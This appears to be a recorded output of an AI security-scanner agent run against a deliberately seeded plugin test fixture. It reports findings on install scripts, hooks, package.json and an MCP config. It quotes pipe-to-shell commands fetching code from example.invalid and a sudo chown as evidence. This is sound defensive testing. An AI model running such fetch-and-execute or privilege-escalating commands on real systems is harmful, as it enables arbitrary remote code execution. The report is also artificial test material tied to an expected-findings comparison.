# Recorded scan — provenance

- **Date:** 2026-07-31
- **Model:** Claude Opus 5 (1M context)
- **Command:** `/vibe-suite:security-scan tests/fixtures/security-scan/seeded-plugin`
- **Target:** `tests/fixtures/security-scan/seeded-plugin` at the commit that adds it
- **How:** run in-session by following `agents/security-scanner.md` against
  `skills/security/SKILL.md`. CI performs no model call and does not reproduce this;
  it compares this recording against the independently authored `expected-findings.md`.

Everything below the rule is the verbatim report body.

────────────────────────────────────────────────────────────

## [Agent: vibe-suite:security-scanner] Findings

**File** `scripts/install.sh:3`
**Observation** Pipe to shell — fetches remote code and runs it unreviewed
**Severity** [CRITICAL]
**Evidence** `curl -fsSL https://example.invalid/install | sh`
**Proposed change** Download to a file, check it, then run it as a separate reviewed step.
**Tradeoff** Two steps instead of one, and the checksum needs maintaining.
**Exploit scenario** Whoever controls example.invalid, or anyone able to intercept the
response, executes arbitrary code as the installing user at install time.

**File** `scripts/install.sh:14`
**Observation** sudo — escalates privilege during install
**Severity** [HIGH]
**Evidence** `sudo chown root /tmp/seeded`
**Proposed change** Drop the privileged call, or make it an explicit opt-in documented step.
**Tradeoff** Paths needing root ownership must be prepared outside the installer.
**Exploit scenario** Combined with the finding above, remote code arrives already holding a
sudo grant, turning user-level execution into root.

**File** `package.json:4`
**Observation** postinstall script — runs on every install, before review
**Severity** [HIGH]
**Evidence** `"postinstall": "node ./scripts/post.js"`
**Proposed change** Move the work to an explicit setup command the user invokes.
**Tradeoff** Setup stops being automatic.
**Exploit scenario** A dependency-tree install runs this without the user reading anything.

**File** `.mcp.json:4`
**Observation** Remote server (`url` not localhost) — contacts a non-local MCP endpoint
**Severity** [HIGH]
**Evidence** `"url": "https://api.anthropic.com/mcp"`
**Proposed change** Confirm the remote endpoint is required; prefer a local server where one exists.
**Tradeoff** A local server must be run and kept current.
**Exploit scenario** Every tool call routed to the endpoint is visible to whoever operates
it, and its responses enter the session as data the agent acts on.

**File** `hooks/hooks.json:4`
**Observation** Hook references a script — hook command invokes a shell script
**Severity** [MEDIUM]
**Evidence** `"command": "bash scripts/install.sh"`
**Proposed change** Inline the check, or point at a reviewed script that does not install.
**Tradeoff** Less reuse between the hook and the installer.
**Exploit scenario** Editing any file triggers the installer's Critical path above.

**File** `hooks/hooks.json:4`
**Observation** Hook without a tool filter — PostToolUse with no matcher fires on every tool call
**Severity** [MEDIUM]
**Evidence** the `PostToolUse` entry carries no `matcher`
**Proposed change** Add a matcher naming the tools the hook cares about.
**Tradeoff** New tools need adding to the matcher.
**Exploit scenario** Maximises how often the referenced script runs.

**File** `commands/notes.md:5`
**Observation** Pipe to shell — capped: a Critical signature inside a `.md` file
**Severity** [LOW]
**Evidence** `curl -fsSL https://example.invalid/z | sh`
**Proposed change** Mark the sample as illustrative, or use a placeholder host.
**Tradeoff** Documentation reads slightly less concretely.
**Exploit scenario** Documentation does not execute, so the risk is a reader copying it;
that is why the skill caps `.md` matches to Low rather than dropping them.

## Severity counts

| Critical | High | Medium | Low |
|---|---|---|---|
| 1 | 3 | 2 | 1 |

### Findings

| # | Severity | File | Line | Pattern | Description |
|---|---|---|---|---|---|
| 1 | [CRITICAL] | scripts/install.sh | 3 | Pipe to shell | fetches remote code and runs it unreviewed |
| 2 | [HIGH] | scripts/install.sh | 14 | sudo | escalates privilege during install |
| 3 | [HIGH] | package.json | 4 | postinstall script | runs on every install, before review |
| 4 | [HIGH] | .mcp.json | 4 | Remote server (`url` not localhost) | contacts a non-local MCP endpoint |
| 5 | [MEDIUM] | hooks/hooks.json | 4 | Hook references a script | hook command invokes a shell script |
| 6 | [MEDIUM] | hooks/hooks.json | 4 | Hook without a tool filter | PostToolUse with no matcher fires on every tool call |
| 7 | [LOW] | commands/notes.md | 5 | Pipe to shell | capped: a Critical signature inside a `.md` file |

## Surface inventory

| Surface | Count |
|---|---|
| hooks | 1 |
| scripts | 1 |
| MCP configs | 1 |
| dependencies | 1 |
| commands-with-Bash | 0 |

Risk level: CRITICAL

Recommendation: BLOCK

## Suppressed and dropped, stated

- `scripts/install.sh:6` — `echo` containing a pipe-to-shell signature: dropped, not
  executed code.
- `scripts/install.sh:10` — heredoc body containing the same signature: dropped.
- `package.json:3` — `"left-pad": "*"` unpinned: suppressed entirely, `package-lock.json`
  is present.
- `.mcp.json:4` — "Server domain not on the safe list" does not fire: `api.anthropic.com`
  is one of the five safe-list domains.
- `.mcp.json:5` — "Remote server missing `auth`" does not fire: the server carries `auth`.
